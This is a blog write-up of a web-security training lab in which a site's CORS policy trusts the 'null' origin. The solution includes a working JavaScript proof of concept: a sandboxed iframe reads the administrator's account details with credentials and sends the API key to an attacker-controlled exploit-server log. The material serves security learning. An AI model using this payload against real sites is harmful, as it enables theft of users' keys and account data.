---
layout: post
title:  "CORS vulnerability with trusted null origin"
date:   2024-10-16 11:20:54 +0530
---

## Introduction 

This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter 

## Solution 

Same as a previous lab but the misconfiguration here is it trusts the `null` origin and you can confirm it by sending the following header `Origin: null` and In the response, `ACAO` responds with `null` as well through the `/accountDetails` endpoint 

![]({{ site.baseurl }}/assets/images/cors-11.png)

<p>
  &gt; If ACAO sets to <mark>null</mark>, then it allows the server able to call the 
  <code>file://</code> protocol, set up a sandboxed environment, and create an 
  <code>iframe</code> as well.
</p>

Then, with the following POC we are creating sandboxed iframe which will allow the iframe to run the scripts, allow the form submission and takes care of window navigation as well **(Allows the iframe to navigate the top-level browsing context)** 

```js
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a9200df043194ec83c1559600ec001f.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://exploit-0a3d00df0402945a83bd545801310064.exploit-server.net/log?key='+this.responseText;
};
</script>"></iframe>
```

Once after delivering the above POC to victim and checking the access log shows that we have got the administrator API key

![]({{ site.baseurl }}/assets/images/cors-12.png)

Take the API key and submit it as solution and solves the lab 

![]({{ site.baseurl }}/assets/images/cors-13.png)